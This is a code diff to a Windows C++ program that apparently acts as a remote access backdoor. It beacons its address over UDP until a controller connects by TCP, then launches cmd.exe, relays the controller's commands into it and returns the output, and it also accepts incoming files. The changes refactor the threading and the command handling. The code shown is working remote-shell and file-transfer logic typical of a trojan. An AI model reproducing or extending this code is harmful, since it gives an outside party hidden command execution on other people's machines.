@@ -3,11 +3,9 @@
 #include <winsock2.h>
 #include <windows.h>
 #include <typeinfo>
-#include <thread>
 #include <fstream>
 #define BUFFER 1024
 
-#pragma comment(lib,"WS2_32.lib")
 using namespace std;
 
 const char* CMD_EXIT="exit";
@@ -90,9 +88,9 @@ bool GetOutput( const string &endStr, string &outstr ) {
 	char buffer[4096] = {0};
 	DWORD readBytes = 0;
 	while(1) {
-		if( FALSE == PeekNamedPipe( m_hChildOutputRead, buffer, sizeof(buffer) - 1, &readBytes, 0, NULL ) )
+		if(FALSE == PeekNamedPipe( m_hChildOutputRead, buffer, sizeof(buffer) - 1, &readBytes, 0, NULL ) )
 			return false;
-		if( 0 == readBytes ) {
+		if(0 == readBytes ) {
 			Sleep(200);
 			continue;
 		}
@@ -166,7 +164,7 @@ void cmdMode() {
 	int leng;
 	send(client,OK,strlen(OK),0);
 	RunProcess("cmd.exe");
-	GetOutput(">",ReadBuff);
+	if (!GetOutput(">",ReadBuff)) return;
 	send(client,ReadBuff.c_str(),ReadBuff.length(),0);
 	while (true) {
 		fill(WriteBuff,WriteBuff+strlen(WriteBuff),'\0');
@@ -178,14 +176,16 @@ void cmdMode() {
 			waiting=true;
 			return;
 		}
-		if (WriteBuff[0]==':'&&WriteBuff[1]==':')
+		if (WriteBuff[0]=='e'&&WriteBuff[1]=='x'&&WriteBuff[2]=='i'&&WriteBuff[3]=='t') {
+			SetInput(WriteBuff);
 			return;
+		}
 		SetInput(WriteBuff);
-		GetOutput(">",ReadBuff);
+		if (!GetOutput(">",ReadBuff)) return;
 		send(client,ReadBuff.c_str(),ReadBuff.length(),0);
 	}
 }
-void waitTCP() {
+DWORD WINAPI waitTCP(LPVOID args) {
 	tcp=socket(AF_INET,SOCK_STREAM,0);
 	bool rr=true;
 	setsockopt(tcp, SOL_SOCKET, SO_REUSEADDR, (char*)&rr, sizeof(BOOL));
@@ -211,7 +211,7 @@ void waitTCP() {
 		if (leng==0) {
 			closesocket(tcp);
 			waiting=true;
-			return;
+			return 0;
 		}
 		for (find=0; find<=leng; find++) if (buf[find]==':') break;
 		fill(n,n+find,'\0');
@@ -220,14 +220,14 @@ void waitTCP() {
 		if (strcmp(n,CMD_EXIT)==0) {
 			closesocket(tcp);
 			waiting=true;
-			return;
+			return 0;
 		} else if (strcmp(n,CMD_CMD)==0) {
 			cmdMode();
 			continue;
 		} else if (strcmp(n,CMD_QUIT)==0) {
 			closesocket(tcp);
 			exit(0);
-			return;
+			return 0;
 		} else if (strcmp(n,CMD_SENDFILE)==0) {
 			recvFile();
 			continue;
@@ -268,8 +268,7 @@ void doOne() {
 	in_addr addr;
 	memcpy(&addr, host->h_addr_list[0], sizeof(in_addr));
 	char* c=inet_ntoa(addr);
-	thread t(waitTCP);
-	t.detach();
+	CreateThread(NULL, 0, waitTCP, NULL, 0, 0);
 	while (waiting) {
 		sendto(s, c, strlen(c), 0, (sockaddr*)&sin, sizeof(sin));
 		Sleep(500);
